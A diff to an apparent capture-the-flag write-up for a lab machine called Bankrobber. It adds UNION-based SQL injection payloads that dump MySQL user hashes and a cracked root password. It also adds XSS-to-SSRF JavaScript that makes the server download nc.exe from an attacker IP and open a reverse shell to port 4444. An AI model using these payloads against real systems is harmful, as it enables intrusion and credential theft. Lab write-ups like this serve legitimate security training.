@@ -160,7 +160,7 @@ The `/admin` dir is not accessible, session managment and authorization will be 
 
 `notes.txt` provided some useful Dev notes left behind possibly for later.
 
-![](img/notes.png)
+![](img/redhearing.png)
 
 let's do a quick HTTP packet header analysis of the `.php` files with `curl`
 
@@ -251,7 +251,7 @@ We might be able to utilize this to reflect and execute a .js stored on our own 
 
 So now that we formulated our devious masterplan, lets build the tools we need to perform.
 
-### Weaponization
+### Weaponization: XSS->session hijacking
 Here we build a simple XSS to drop in the comment box in `transfer.php`
 
 XSS Cookie grabber - gets the session token of the admin and reflects it back to us through the url
@@ -268,49 +268,6 @@ function getCookie() {
     document.body.appendChild(img);
 }
 getCookie();
-```
-
-
-XSS payload
-
-```javascript
-//XSS To drop nc.exe:
-<script src=http://10.10.14.5/payd.js%3E</script>
-
-//XSS to Reverse Shell:
-<script src=http://10.10.14.5/pay.js%3E</script>
-```
-
-Dropper - drop's file on remote system through reflected XSS
-
-`payd.js`
-```javascript
-function paintfunc(){
-    var http = new XMLHttpRequest();
-        var url = 'http://localhost/admin/backdoorchecker.php';
-        var params = 'cmd=dir | powershell -c Invoke-WebRequest -Uri "http://10.10.14.5/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"';
-        http.open('POST', url, true);
-        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        http.send(params);
-}
-
-paintfunc();
-```
-
-Execution - executes file on remote system through reflected XSS
-
-`pay.js`
-```javascript
-function paintfunc(){
-    var http = new XMLHttpRequest();
-        var url = 'http://localhost/admin/backdoorchecker.php';
-        var params = 'cmd=dir | powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.14.5 4444';
-        http.open('POST', url, true);
-        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        http.send(params);
-}
-
-paintfunc();
 ```
 
 
@@ -349,11 +306,116 @@ Now we got admin creds `admin:Hopelessromanticbase64` for a inital foothold.
  There is a lot of interesting input/output.
  We see a table for pending transaction approval. The backend of our XSS payload.
  We know from our inital port scan that their is a MYSQL DB. This is worth testing for SQL injection.
- Then our next input field takes a numeric value and returns another table. Out of habbit I instantly inserted an escape quote to see if it would return an error, which isignifies a SQLi point.
+ Then our next input field takes a numeric value and returns another table. Out of habbit I instantly inserted an escape quote that returns `There is a problem with your SQL syntax`, which isignifies a SQLi point. You could use a tool like SQLmap for this but what fun would that be?
  
- The the third input field is a application 
+ **SQL injection**
+`1'OR'1' AND '1'='2' order by 3-- `
+  Tells us there are 3 columns, 2 visable, 1 hidden.
+`1'OR'1' AND '1'='2' union select 1,user(),3-- `
+ gives us the user and hostname of the SQLdb which is localhost since it's on the same machine as this application.
  
+<table style="width:100%">
+  <tr>
+    <th>ID</th>
+    <th>1</th>
+  </tr>
+  <tr>
+    <td>Admin</td>
+    <td>root@localhost</td>
+  </tr>
+</table>
 
+`1'or'1' AND '1'='2' UNION SELECT table_name, column_name, 1 FROM information_schema.columns-- `
+this will dump every column name in the schema.
+
+`1'OR'1' AND '1'='2' UNION SELECT table_schema, table_name, 1 FROM information_schema.tables-- `
+this will dump every table name in the schema.
+ 
+`1'OR'1' AND '1'='2' UNION SELECT group_concat(table_name), 2, 3 FROM information_schema.tables WHERE table_schema=database()-- `
+return the database name.
+
+```mysql
+/*
+DB name: bankrobber 
+user: root@localhost
+version: 10.1.38-MariaDB 
+*/
+
+1'OR'1' AND '1'='2' UNION SELECT concat(host, user, password),2,3 FROM mysql.user-- 
+
+/*
+localhostroot*F435725A173757E57BD36B09048B8B610FF4D0C4    2
+127.0.0.1root*F435725A173757E57BD36B09048B8B610FF4D0C4    2
+::1root*F435725A173757E57BD36B09048B8B610FF4D0C4    2
+localhost    2
+localhostpma    2
+HASH: F435725A173757E57BD36B09048B8B610FF4D0C4
+
+Possible Hashs:
+[+]  SHA-1
+[+]  MySQL5 - SHA-1(SHA-1($pass))
+F435725A173757E57BD36B09048B8B610FF4D0C4 MySQL4.1/MySQL5 
+User: root
+Password Welkom1!
+*/
+```
+So after picking the DB apart I was able to get a password hash.
+That I was easily able to crack using rainbow tables.
+
+So let's look at the third input field.
+
+Backdoorchecker:
+To quickly identify backdoors located on our server;
+we implemented this function.
+For safety issues you're only allowed to run the 'dir' command with any arguments.
+
+So we run `dir` into the field and get prompted.
+
+`It's only allowed to access this function from localhost (::1).
+This is due to the recent hack attempts on our server.`
+
+I tried a bunch of Curl post request spoofing the headers to make it look like the packet was coming from localhost but no cigar.
+
+After taken a short break, I then observed that since maybe we can't manipulate the backdoorchecker field from our host. Why not just go back to the XSS we found in the coin transfer and do SSRF to get a RCE. In-fucking-deed! 
+
+let's weponize this mothafucker.
+
+### Weaponization: XSS->SSRF->RCE
+
+XSS To drop nc.exe:
+`<script src=http://10.10.14.5/payd.js%3E</script>`
+
+XSS to Reverse Shell:
+`<script src=http://10.10.14.5/pay.js%3E</script>`
+
+`payd.js`
+```
+//Dropper:
+function paintfunc(){
+    var http = new XMLHttpRequest();
+        var url = 'http://localhost/admin/backdoorchecker.php';
+        var params = 'cmd=dir | powershell -c Invoke-WebRequest -Uri "http://10.10.14.5/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"';
+        http.open('POST', url, true);
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.send(params);
+}
+
+paintfunc();
+```
+`pay.js`
+```
+//Execution:
+function paintfunc(){
+    var http = new XMLHttpRequest();
+        var url = 'http://localhost/admin/backdoorchecker.php';
+        var params = 'cmd=dir | powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.14.5 4444';
+        http.open('POST', url, true);
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.send(params);
+}
+
+paintfunc();
+```
 
 
 ### Exploitation
